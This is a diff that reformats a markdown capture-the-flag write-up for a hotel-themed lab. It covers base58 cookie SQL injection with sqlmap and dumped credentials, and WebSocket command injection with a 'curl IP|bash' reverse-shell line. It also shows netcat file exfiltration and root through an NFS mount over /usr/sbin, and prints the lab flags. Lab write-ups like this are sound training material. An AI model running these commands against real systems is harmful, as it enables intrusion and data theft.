@@ -1,55 +1,49 @@
+# HELL'S KITCHEN DX2
 
-# PORT SCAN
----
+## PORT SCAN
 
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 80   | HTTP    |
 | 4346 | HTTP    |
 
+## RECONNAISSANCE
 
-
-# RECONNAISSANCE
----
+***
 
 If we check the web application at port 80, we can find this:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702155653.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702155653.png)
 
 We got some utilities, if we try booking a room, this happens:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702155725.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702155725.png)
 
 We get an alert saying the hotel is currently fully booked, that's weird, let's check other functionalities:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702161606.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702161606.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702161616.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702161616.png)
 
 Let's check the other port:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702164915.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702164915.png)
 
 Nothing we can do yet, no credentials. Our best chance is the other web application.
 
 Ok, we got some info, if we check source code, we can find this:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702161710.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702161710.png)
 
 There's a call to `check-rooms.js`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702161728.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702161728.png)
 
 The script pulls in the current room count from `/api/rooms-available`, turns on the “#booking” button, and then wires up its click handler: if fewer than 6 rooms are reported it sends you straight to `new-booking`, otherwise it pops up an alert saying the hotel’s fully booked.
 
-Let's interact with the API: 
+Let's interact with the API:
 
 ```bash
 curl -s -X GET http://10.10.129.203/api/rooms-available
@@ -58,25 +52,21 @@ curl -s -X GET http://10.10.129.203/api/rooms-available
 
 Not much we can do with it, we can check `new-booking` though:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702162514.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702162514.png)
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702162458.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702162458.png)
-
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702162544.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702162544.png)
 
 This script defines a `getCookie` helper to extract a named cookie’s value, then uses it to retrieve the `BOOKING_KEY` from `document.cookie`. It sends a GET request to `/api/booking-info?booking_key=<key>`, parses the JSON response, and auto‑fills the form fields `#rooms` with `data.room_num` and `#nights` with `data.days`, effectively pre‑populating the booking form based on the stored booking key.
 
 As seen, we can notice the `BOOKING_KEY` cookie on our browser:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702162749.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702162749.png)
 
 This is base58 encoding, if we use cyberchef, we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702162847.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702162847.png)
 
 We got:
 
@@ -86,35 +76,33 @@ booking_id:9148112
 
 Let's interact with the API, for now, we can begin exploitation phase.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 We can interact with the API using curl or a proxy, I'll use caido:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163137.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163137.png)
 
 It says not found, let's try sending another stuff as the key, maybe `LFI` or `SQLI` works, even `SSRF`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163549.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163549.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163351.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163351.png)
 
 LFI doesn't work here, I tried some payloads but no luck, let's try `SQLI`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163611.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163611.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163714.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163714.png)
 
 No bad request so it may work, let's try to enumerate the number of rows by using `order by`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163810.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163810.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163858.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163858.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702163911.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702163911.png)
 
 On `3` we get a bad request, which means that SQLI is possible, we can automate the process with `sqlmap` but we need a tamper, a tamper is a little Python hook that sits between the tool and the target, grabbing every injection payload sqlmap generates and transforming it before it’s sent. we need it thanks to the `base58` format, let's use this script:
 
@@ -141,7 +129,6 @@ Now, we need to create a tamper.py file with those contents and an `__init__.py`
 sqlmap -u "http://IP/api/booking-info?booking_key=" -p "booking_key" --tamper=PATH TO TAMPER.PY/tamper.py --dbms=sqlite --technique=U --string="not found" --random-agent --level=5 --risk=3 --dump -batch
 ```
 
-
 Make sure you got `base58` on pip before using the command:
 
 ```
@@ -150,8 +137,7 @@ pip install base58
 
 We can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702164805.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702164805.png)
 
 There are some credentials:
 
@@ -161,13 +147,11 @@ pdenton:4321chameleon
 
 We can use them on the 4346 port web application:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702165049.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702165049.png)
 
 There's a message from `SweetCharity` to our user, we can see this on the source code:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702165158.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702165158.png)
 
 There's a `js` script embedded, let's beautify it:
 
@@ -192,20 +176,18 @@ let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
 socket.onmessage = e => document.querySelector(".time").innerText = e.data, setInterval((() => socket.send(tz)), 1e3);
 ```
 
-This snippet first grabs every row in the “.email_list” and wires up a click handler so that when a row is clicked it: 
+This snippet first grabs every row in the “.email\_list” and wires up a click handler so that when a row is clicked it:
 
-1) removes the “selected” class from whatever was highlighted and adds it to the clicked row, 
-2) pulls out that row’s `data-id`, sender name, and subject text, 
-3) updates the headers on the page, and 
-4) does a GET to `/api/message?message_id=<id>`, reads the plain‑text (which is Base64‑encoded), decodes it with `atob()`, and dumps it into the message body area. It also hooks a “back” button to redirect to “/” and opens a WebSocket to `ws://<host>/ws`, sending the browser’s time zone string every second and updating a “.time” element with whatever the server pushes back.
-
+1. removes the “selected” class from whatever was highlighted and adds it to the clicked row,
+2. pulls out that row’s `data-id`, sender name, and subject text,
+3. updates the headers on the page, and
+4. does a GET to `/api/message?message_id=<id>`, reads the plain‑text (which is Base64‑encoded), decodes it with `atob()`, and dumps it into the message body area. It also hooks a “back” button to redirect to “/” and opens a WebSocket to `ws://<host>/ws`, sending the browser’s time zone string every second and updating a “.time” element with whatever the server pushes back.
 
 Due to the format of `/message?message_id=id`, we may be able to fuzz, let's automate the process on Caido:
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702165550.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702165550.png)
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702165616.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702165616.png)
 
 5 messages got `200` status code, let's check them:
 
@@ -293,18 +275,19 @@ be shipped immediately.
 
 That's all we can find for the id fuzzing part, if we remember the script opens a `websocket`, we can manipulate this WebSocket to execute commands let's use burp on this case for `websocket` manipulation:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702173041.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702173041.png)
 
 If we test a simple `command injection`, we get this:
 
 ```
 UTC;id;
 ```
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702173113.png)
+
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702173113.png)
 
 This means that command injection is possible, so, getting a shell is possible too, in order to get a shell, we can use `busybox` or create a `index.html` file with a python reverse shell:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702172303.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702172303.png)
 
 Now, we need to host it using a python server and use curl to get the file, once the file downloads, we need to use bash to execute it, we can do all this with the following command:
 
@@ -312,18 +295,17 @@ Now, we need to host it using a python server and use curl to get the file, once
 UTC;curl 10.14.21.28|bash;
 ```
 
->Note: Make sure to use only ports `80` and `443` because the server is only able to reach us on those ports.
+> Note: Make sure to use only ports `80` and `443` because the server is only able to reach us on those ports.
 
 Once we send it, this happens:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702173230.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702173230.png)
 
 We get a shell as seen, let's proceed with privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 First of all, we need to stabilize our shell:
 
@@ -337,8 +319,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702173353.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702173353.png)
 
 We got some users on here:
 
@@ -444,7 +425,6 @@ hotel tasks, q1 52
 buy her something special maybe - she used to like raspberry candy - as thanks for locking the machine down. 'ports are blocked' whatever that means. my smart girl
 ```
 
-
 That may be the password for `sandra`, let's try to switch:
 
 ```
@@ -481,7 +461,7 @@ This is the password for `Sandra:`
 sandra:anywherebuthere
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702181202.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702181202.png)
 
 Let's run `linpeas` again, once we run it, we can find a `boss.jpg` file on the `Pictures` directory of our home:
 
@@ -507,7 +487,7 @@ nc VPN_IP 80 < /home/sandra/Pictures/boss.jpg
 
 We can see this on the picture:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702182020.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702182020.png)
 
 We got credentials for `jojo`:
 
@@ -515,7 +495,7 @@ We got credentials for `jojo`:
 jojo:kingofhellskitchen
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702182056.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702182056.png)
 
 If we check our sudo permissions, we notice this:
 
@@ -529,7 +509,6 @@ Matching Defaults entries for jojo on tonhotel:
 User jojo may run the following commands on tonhotel:
     (root) /usr/sbin/mount.nfs
 ```
-
 
 This allow us to mount a `NFS` share, by doing this, we can achieve root, we will basically mount a writable `NFS` over `/usr/sbin` and replace the `mount.nfs` file, on this way, we can achieve root, let's do it:
 
@@ -555,8 +534,7 @@ Now, modify `/etc/nfs.conf` with:
 port=443
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702190016.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702190016.png)
 
 We need to modify `/etc/exports` with:
 
@@ -564,7 +542,7 @@ We need to modify `/etc/exports` with:
 /tmp/share *(rw,sync,no_subtree_check)
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702185446.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702185446.png)
 
 Now, let's restart the service:
 
@@ -589,7 +567,7 @@ drwxrwxrwx  2 nobody nogroup   40 Jul  2 23:49 .
 drwxr-xr-x 14 root   root    4096 Aug 31  2022 ..
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702190134.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702190134.png)
 
 We can simply replace `/usr/sbin/mount.nfs` with `/bin/bash`:
 
@@ -611,7 +589,7 @@ root@tonhotel:/# whoami
 root
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702190338.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702190338.png)
 
 There we go, let's get both flags and end the CTF:
 
@@ -623,7 +601,4 @@ root@tonhotel:/# cat /root/root.txt
 thm{7f6b4d8aee9e1677a0db343ace5fff23fc5b5d3b}
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250702190453.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250702190453.png)
